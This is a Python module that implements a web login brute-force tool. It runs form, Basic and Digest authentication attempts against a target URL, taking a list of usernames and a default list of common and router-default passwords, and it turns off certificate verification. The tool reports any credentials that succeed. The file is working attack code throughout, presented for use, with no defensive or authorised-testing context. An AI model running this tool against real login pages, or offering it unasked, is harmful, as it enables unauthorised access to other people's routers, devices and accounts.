"""
Web Login Brute Force Tool - Attempts to authenticate against HTTP login pages
Supports form-based auth, Basic auth, and Digest auth
"""
import requests
import urllib3
import time
from typing import List, Dict, Optional, Tuple

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def web_login_brute(
    url: str,
    username_field: str = "username",
    password_field: str = "password",
    usernames: str = "admin",
    passwords: str = "admin,password,1234,root,zyxel,12345,admin123,password123,letmein,admin1",
    auth_type: str = "form",
    delay: float = 0.5,
    timeout: int = 10,
    success_indicator: str = ""
) -> str:
    """
    Attempt to brute-force login on a web interface.
    
    Args:
        url: Login URL (e.g. http://192.168.1.1/cgi-bin/login)
        username_field: Name of the username form field (for form auth)
        password_field: Name of the password form field (for form auth)
        usernames: Comma-separated list of usernames to try
        passwords: Comma-separated list of passwords to try
        auth_type: 'form', 'basic', or 'digest'
        delay: Seconds between attempts
        timeout: Request timeout in seconds
        success_indicator: Text that indicates successful login (if empty, tries to detect)
    """
    username_list = [u.strip() for u in usernames.split(",") if u.strip()]
    password_list = [p.strip() for p in passwords.split(",") if p.strip()]
    
    results = []
    success = False
    
    for username in username_list:
        for password in password_list:
            try:
                if auth_type == "form":
                    # Form-based login
                    session = requests.Session()
                    resp = session.post(
                        url,
                        data={username_field: username, password_field: password},
                        verify=False,
                        timeout=timeout,
                        allow_redirects=True
                    )
                    status = resp.status_code
                    content_len = len(resp.text)
                    
                    # Detect success
                    if status == 200:
                        if success_indicator and success_indicator in resp.text:
                            success = True
                            result_str = f"SUCCESS! username={username} password={password} (status={status}, len={content_len})"
                            results.append(result_str)
                            break
                        elif not success_indicator and content_len > 100:
                            # Heuristic: if we get a page with >100 chars, might be logged in
                            success = True
                            result_str = f"POSSIBLE SUCCESS: username={username} password={password} (status={status}, len={content_len})"
                            results.append(result_str)
                            break
                        else:
                            results.append(f"FAIL: {username}:{password} (status={status}, len={content_len})")
                    elif status == 302 or status == 301:
                        # Redirect often means success
                        success = True
                        results.append(f"SUCCESS! username={username} password={password} (redirect to {resp.headers.get('Location', 'unknown')})")
                        break
                    elif status == 401:
                        results.append(f"FAIL: {username}:{password} (401 Unauthorized)")
                    else:
                        results.append(f"FAIL: {username}:{password} (status={status})")
                
                elif auth_type == "basic":
                    # Basic HTTP auth
                    resp = requests.get(
                        url,
                        auth=(username, password),
                        verify=False,
                        timeout=timeout
                    )
                    if resp.status_code == 200:
                        success = True
                        results.append(f"SUCCESS! username={username} password={password}")
                        break
                    elif resp.status_code == 401:
                        results.append(f"FAIL: {username}:{password} (401)")
                    else:
                        results.append(f"FAIL: {username}:{password} (status={resp.status_code})")
                
                elif auth_type == "digest":
                    from requests.auth import HTTPDigestAuth
                    resp = requests.get(
                        url,
                        auth=HTTPDigestAuth(username, password),
                        verify=False,
                        timeout=timeout
                    )
                    if resp.status_code == 200:
                        success = True
                        results.append(f"SUCCESS! username={username} password={password}")
                        break
                    else:
                        results.append(f"FAIL: {username}:{password} (status={resp.status_code})")
                
                time.sleep(delay)
                
            except requests.exceptions.ConnectionError:
                results.append(f"CONNECTION ERROR: Could not connect to {url}")
                break
            except requests.exceptions.Timeout:
                results.append(f"TIMEOUT: {url} timed out")
                break
            except Exception as e:
                results.append(f"ERROR: {username}:{password} - {str(e)}")
            
        if success:
            break
    
    # Summary
    summary = f"Web Login Brute Force Results for {url}\n"
    summary += f"Auth Type: {auth_type}\n"
    summary += f"Usernames tried: {len(username_list)}, Passwords tried: {len(password_list)}\n"
    summary += f"Total attempts: {len(results)}\n\n"
    
    success_results = [r for r in results if r.startswith("SUCCESS") or r.startswith("POSSIBLE")]
    fail_results = [r for r in results if not r.startswith("SUCCESS") and not r.startswith("POSSIBLE")]
    
    if success_results:
        summary += "=== SUCCESSFUL ATTEMPTS ===\n"
        for r in success_results:
            summary += f"  {r}\n"
        summary += "\n"
    
    # Show last 10 failures
    if fail_results:
        summary += f"=== FAILURES (showing last {min(10, len(fail_results))}) ===\n"
        for r in fail_results[-10:]:
            summary += f"  {r}\n"
    
    return summary
